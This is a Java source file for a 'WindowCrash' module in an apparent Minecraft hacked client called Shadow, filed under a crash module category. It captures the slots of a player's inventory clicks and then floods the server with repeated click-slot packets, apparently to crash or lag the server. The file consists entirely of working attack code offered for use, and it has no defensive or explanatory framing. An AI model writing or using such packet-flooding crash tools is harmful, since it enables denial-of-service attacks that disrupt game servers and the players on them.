package net.shadow.feature.module.crash;

import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.screen.slot.SlotActionType;
import net.shadow.Shadow;
import net.shadow.event.events.PacketOutput;
import net.shadow.feature.base.Module;
import net.shadow.feature.base.ModuleType;
import net.shadow.feature.configuration.SliderValue;
import net.shadow.utils.ChatUtils;

public class WindowCrash extends Module implements PacketOutput {
    static final Integer[] slotid = new Integer[]{0, 0, 0, 0};
    static int capturedslotids = 0;
    final SliderValue r = this.config.create("Repeat", 1, 1, 10, 1);
    final SliderValue mm = this.config.create("Multi", 1, 1, 4, 1);

    public WindowCrash() {
        super("WindowCrash", "Spams Window clicks", ModuleType.CRASH);
    }

    @Override
    public void onEnable() {
        Shadow.getEventSystem().add(PacketOutput.class, this);
        capturedslotids = 0;
    }

    @Override
    public void onDisable() {
        Shadow.getEventSystem().remove(PacketOutput.class, this);
        capturedslotids = 0;
    }

    @Override
    public void onUpdate() {
        if (capturedslotids == (int) Math.round(mm.getThis())) {
            try {
                for (int i = 0; i < r.getThis(); i++) {
                    for (int j = 0; j < mm.getThis(); j++) {
                        Shadow.c.interactionManager.clickSlot(Shadow.c.player.currentScreenHandler.syncId, slotid[j], 0, SlotActionType.PICKUP, Shadow.c.player);
                    }
                }
            } catch (Exception e) {
                this.setEnabled(false);
            }
        }
    }

    @Override
    public void onRender() {

    }

    @Override
    public void onSentPacket(PacketOutputEvent event) {
        if (event.getPacket() instanceof ClickSlotC2SPacket packet && capturedslotids < (int) Math.round(mm.getThis())) {
            slotid[capturedslotids] = packet.getSlot();
            capturedslotids++;
            ChatUtils.message("Slot Selected, " + capturedslotids + "/" + (int) Math.round(mm.getThis()) + " Until completion");
            if (capturedslotids == mm.getThis()) {
                ChatUtils.message("Spammer Started!");
            }
        }
    }
}
